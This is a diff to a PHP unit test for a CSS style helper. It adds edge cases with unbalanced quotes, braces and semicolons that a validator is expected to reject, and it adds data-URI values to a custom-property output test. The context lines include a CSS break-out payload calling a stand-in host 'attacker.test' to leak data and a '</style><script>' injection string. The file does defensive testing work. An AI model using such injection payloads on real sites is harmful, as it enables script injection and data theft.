@@ -157,6 +157,11 @@ class StyleTest extends AbstractTestCase
     {
         yield 'rule break-out' => ['red;}body{background:url(//attacker.test/leak)}.y{--z:0'];
         yield 'semicolon' => ['red;color:blue'];
+        yield 'semicolon after closed string' => ['"a";}body{x:y'];
+        yield 'semicolon after closed single-quoted string' => ["'a';color:blue"];
+        yield 'unterminated double quote' => ['"a;b'];
+        yield 'unterminated single quote' => ["'a;b"];
+        yield 'brace inside string' => ['"}"'];
         yield 'opening brace' => ['{'];
         yield 'closing brace' => ['}'];
         yield 'closing style tag' => ['</style><script>alert(1)</script>'];
@@ -175,11 +180,14 @@ class StyleTest extends AbstractTestCase
             'shadow' => '0 1px 2px rgb(0 0 0 / 50%)',
             'image' => 'url("https://example.test/a.png")',
             'size' => 12,
+            'icon' => 'url("data:image/svg+xml;base64,PHN2Zy8+")',
+            'mask' => "url('data:image/png;base64,iVBO')",
         ]);
 
         static::assertSame(
             ':root{--font:"Inter", sans-serif;--shadow:0 1px 2px rgb(0 0 0 / 50%);'
-            . '--image:url("https://example.test/a.png");--size:12;}',
+            . '--image:url("https://example.test/a.png");--size:12;'
+            . '--icon:url("data:image/svg+xml;base64,PHN2Zy8+");--mask:url(\'data:image/png;base64,iVBO\');}',
             $testee->cssVarsAsString(),
         );
     }
